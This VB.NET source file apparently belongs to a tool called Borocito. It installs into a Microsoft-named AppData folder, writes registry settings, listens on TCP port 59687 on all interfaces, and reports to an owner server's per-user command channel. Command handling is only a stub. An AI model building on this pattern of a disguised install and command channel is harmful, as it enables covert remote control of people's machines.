Imports System.Runtime.InteropServices
Imports System.Text
Imports System.IO.Compression
Imports Microsoft.Win32
Imports System.Net.Sockets
Imports System.Threading
Imports System.Net
Imports System.IO
Module Utility
    Public tlmContent As String
    Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
        Try
            Dim OverWrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRCommons & "\boro-hear.log") Then
                OverWrite = True
            End If
            Dim finalContent As String = Nothing
            If flag = True Then
                finalContent = " [!!!]"
            End If
            Dim Message As String = DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & finalContent & " [" & from & "] " & content
            tlmContent = tlmContent & Message & vbCrLf
            Console.WriteLine("[" & from & "]" & finalContent & " " & content)
            Try
                My.Computer.FileSystem.WriteAllText(DIRCommons & "\boro-hear.log", vbCrLf & Message, OverWrite)
            Catch
            End Try
        Catch ex As Exception
            Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
        End Try
    End Sub
    <DllImport("kernel32")>
    Private Function GetPrivateProfileString(ByVal section As String, ByVal key As String, ByVal def As String, ByVal retVal As StringBuilder, ByVal size As Integer, ByVal filePath As String) As Integer
        'Use GetIniValue("KEY_HERE", "SubKEY_HERE", "filepath")
    End Function
    Public Function GetIniValue(section As String, key As String, filename As String, Optional defaultValue As String = Nothing) As String
        Dim sb As New StringBuilder(500)
        If GetPrivateProfileString(section, key, defaultValue, sb, sb.Capacity, filename) > 0 Then
            Return sb.ToString
        Else
            Return defaultValue
        End If
    End Function
End Module
Module GlobalUses
    Public parameters As String
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito\boro-hear"

    Public borocitoPort As Integer
    Public HttpOwnerServer As String
    Public UID As String
End Module
Module StartUp
    Sub Init()
        Try
            CommonActions()
            CheckInstall()
            IniciarComunicacionConExternos()
        Catch ex As Exception
            AddToLog("Init@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub CommonActions()
        Try
            If Not My.Computer.FileSystem.DirectoryExists(DIRCommons) Then
                My.Computer.FileSystem.CreateDirectory(DIRCommons)
            End If
        Catch ex As Exception
            AddToLog("CommonActions@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub CheckInstall()
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-hear", True)
            If regKey Is Nothing Then
                Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito\\boro-hear")
                regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-hear", True)
            End If

            regKey.SetValue("boro-hear", Application.ExecutablePath)
            regKey.SetValue("Name", My.Application.Info.AssemblyName)
            regKey.SetValue("Version", My.Application.Info.Version.ToString)
            regKey.SetValue("tcp ip", ServerIP)
            regKey.SetValue("tcp port", ServerIP)

            regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
            HttpOwnerServer = "http://" & regKey.GetValue("OwnerServer")
            UID = regKey.GetValue("UID")
        Catch ex As Exception
            AddToLog("CheckInstall@StartUp", "Error: " & ex.Message, True)
            End
        End Try
    End Sub
End Module
Module hear_CONNECT
    Dim SERVIDOR As TcpListener
    Dim THREADSERVIDOR As Thread
    Public ServerIP As String = "localhost"
    Public ServerPort As Integer = 59687
    Private Structure NUEVOCLIENTE
        Public SOCKETCLIENTE As Socket
        Public THREADCLIENTE As Thread
        Public MENSAJE As String
    End Structure
    Dim CLIENTES As New Hashtable
    Dim CLIENTEIP As IPEndPoint

    Sub IniciarComunicacionConExternos()
        SERVIDOR = New TcpListener(IPAddress.Any, ServerPort) 'CONEXION
        SERVIDOR.Start()
        THREADSERVIDOR = New Thread(AddressOf ESCUCHAR) 'PARA RECIBIR LAS CONEXIONES DE LOS CLIENTES
        THREADSERVIDOR.Start()
    End Sub
    Public Sub ESCUCHAR() 'PARA RECIBIR LAS CONEXIONES DE LOS CLIENTES
        Dim CLIENTE As New NUEVOCLIENTE
        While True
            Try
                CLIENTE.SOCKETCLIENTE = SERVIDOR.AcceptSocket 'NUEVA CONEXION DE CLIENTE
                CLIENTEIP = CLIENTE.SOCKETCLIENTE.RemoteEndPoint 'IP DEL CLIENTE
                CLIENTE.THREADCLIENTE = New Thread(AddressOf LEER) 'PARA RECIBIR LOS MENSAJES DE LOS CLIENTES
                CLIENTES.Add(CLIENTEIP, CLIENTE) 'LO AÑADE AL HASTABLE CLIENTES
                CLIENTE.THREADCLIENTE.Start()
            Catch ex As Exception
            End Try
        End While
    End Sub
    Public Sub LEER() 'PARA RECIBIR LOS MENSAJES DE LOS CLIENTES
        Dim CLIENTE As New NUEVOCLIENTE
        Dim DATOS() As Byte
        Dim IP As IPEndPoint = CLIENTEIP 'OBTIENE LA IP Y PUERTO DEL CLIENTE
        CLIENTE = CLIENTES(IP)
        While True
            If CLIENTE.SOCKETCLIENTE.Connected Then
                DATOS = New Byte(1024) {}
                Try
                    If CLIENTE.SOCKETCLIENTE.Receive(DATOS, DATOS.Length, 0) > 0 Then
                        CLIENTE.MENSAJE = Encoding.ASCII.GetString(DATOS) 'MENSAJE RECIBIDO
                        CLIENTES(IP) = CLIENTE
                        ACCIONES(IP) 'EJECUTA LA ACCION CORRESPONDIENTE EN FUNCION DEL MENSAJE RECIBIDO
                    Else
                        Exit While
                    End If
                Catch ex As Exception
                    Exit While
                End Try
            End If
        End While
        CERRARTHREAD(IP)
    End Sub

    Private Sub ACCIONES(ByVal IDTerminal As IPEndPoint)
        Dim MENSAJE As String = OBTENERDATOS(IDTerminal).Replace(vbNullChar, Nothing)
        'procesarlo y enviarlo



        ENVIARUNO(IDTerminal, "[OK]")
    End Sub

    Public Function OBTENERDATOS(ByVal IDCliente As IPEndPoint) As String
        Dim CLIENTE As NUEVOCLIENTE
        CLIENTE = CLIENTES(IDCliente)
        Return CLIENTE.MENSAJE
    End Function
    Public Sub ENVIARUNO(ByVal IDCliente As IPEndPoint, ByVal Datos As String)
        Dim Cliente As NUEVOCLIENTE
        Cliente = CLIENTES(IDCliente)
        Cliente.SOCKETCLIENTE.Send(Encoding.ASCII.GetBytes(Datos))
    End Sub
    Public Sub ENVIARTODOS(ByVal Datos As String)
        Dim CLIENTE As NUEVOCLIENTE
        For Each CLIENTE In CLIENTES.Values
            CLIENTE.SOCKETCLIENTE.Send(Encoding.ASCII.GetBytes(Datos))
        Next
    End Sub
    Public Sub CERRARTHREAD(ByVal IP As IPEndPoint)
        Dim CLIENTE As NUEVOCLIENTE = CLIENTES(IP)
        Try
            CLIENTE.THREADCLIENTE.Abort()
        Catch ex As Exception
            CLIENTES.Remove(IP)
        End Try
    End Sub
    Public Sub CERRARTODO()
        Dim CLIENTE As NUEVOCLIENTE
        For Each CLIENTE In CLIENTES.Values
            CLIENTE.SOCKETCLIENTE.Close()
            CLIENTE.THREADCLIENTE.Abort()
        Next
    End Sub
End Module
Module server_CONNECT
    Sub SendToServer(ByVal message As String)
        Try
            'Create CMD file on server
            Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Users/Commands/cliResponse.php")
            request.Method = "POST"
            Dim postData As String = "ident=" & UID & "&text=" & "#Command Channel for Unique User. CMD Created (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
                vbCrLf & "Command1>" &
                vbCrLf & "Command2>" & message &
                vbCrLf & "Command3>" &
                vbCrLf & "[Response]" &
                vbCrLf
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            AddToLog("SendToServer@server_CONNECT", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
            'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
            'End If
            response.Close()
        Catch ex As Exception
            AddToLog("SendToServer@server_CONNECT", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module